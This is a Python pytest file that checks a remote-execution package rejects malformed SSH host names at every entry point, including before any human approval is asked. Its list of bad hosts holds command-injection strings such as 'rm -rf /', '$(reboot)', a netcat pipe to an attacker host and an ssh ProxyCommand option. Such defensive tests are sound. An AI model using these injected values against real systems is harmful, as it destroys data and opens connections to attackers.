"""Injection: every entry point that takes a host refuses a bad one.

One rule, tested at every door: a host is one closed-alphabet word or
the call does not happen. The doors are the validator, both argv
builders, the plane, the executor, the tools, and the jobs route's
runtime field.
"""

from __future__ import annotations

import pytest

from omicsclaw.memory.database import Database
from omicsclaw.remote.jobs import RemoteJobHandle
from omicsclaw.remote.plane import RemoteExecutor, RemotePlaneBinding
from omicsclaw.remote.ssh import RemoteHostRefused, build_sftp_argv, build_ssh_argv
from omicsclaw.tools.builtin.remote import (
    RemoteExecTool,
    ToolArgumentError,
    valid_host,
)
from omicsclaw.tools import use_tool_context

from tests.remote._fakes import FakePlane, run

BAD_HOSTS = [
    "",
    "hpc1;rm -rf /",
    "hpc1 $(reboot)",
    "hpc1|nc attacker 4444",
    "hpc1\nInjection: yes",
    "'hpc1'",
    "hpc1 -oProxyCommand=evil",
    "-oBatchMode=no",
    "hpc1/",
    "hpc1:22",
    "π Machine",
]


@pytest.mark.parametrize("host", BAD_HOSTS)
def test_the_validator_refuses_every_malformed_host(host):
    with pytest.raises(RemoteHostRefused):
        build_ssh_argv(host, "true")


@pytest.mark.parametrize("host", BAD_HOSTS)
def test_sftp_refuses_every_malformed_host(host):
    with pytest.raises(RemoteHostRefused):
        build_sftp_argv(host)


@pytest.mark.parametrize("host", BAD_HOSTS)
def test_the_plane_refuses_every_malformed_host(host):
    plane = RemotePlaneBinding(Database(":memory:"))

    async def attempt() -> None:
        await plane.exec(host, "true", 1.0)

    with pytest.raises(RemoteHostRefused):
        run(attempt())


@pytest.mark.parametrize("host", BAD_HOSTS)
def test_the_executor_refuses_every_malformed_host(host):
    with pytest.raises(RemoteHostRefused):
        RemoteExecutor(host, None)  # type: ignore[arg-type]


@pytest.mark.parametrize("host", BAD_HOSTS)
def test_the_tool_refuses_every_malformed_host_before_approval(host):
    import json

    plane = FakePlane()
    asked: list[object] = []

    def approval(request):
        asked.append(request)
        return True

    with use_tool_context(approval=approval, progress=lambda u: None, values={}):
        payload = json.dumps({"host": host, "command": "x", "intent": "i"})
        with pytest.raises(ToolArgumentError):
            run(RemoteExecTool(plane).execute(payload))
    assert asked == []  # nothing was ever put to the human
    assert plane.calls == []


def test_shell_quoting_neutralizes_spaces_and_quotes_in_paths():
    from omicsclaw.remote.ssh import shell_quote

    # A workdir this package constructs is quoted so the remote shell
    # reads it as one word even when it contains both quote kinds.
    quoted = shell_quote("/scratch/lab 42/'s space")
    assert quoted.startswith("'") and quoted.endswith("'")


def test_a_good_host_with_a_dashed_prefix_is_still_refused():
    # The alphabet allows internal dashes; a leading one would be an
    # ssh option even behind -- in older parsers, so it is refused too.
    assert not valid_host("-gpu")
    assert valid_host("gpu-1")
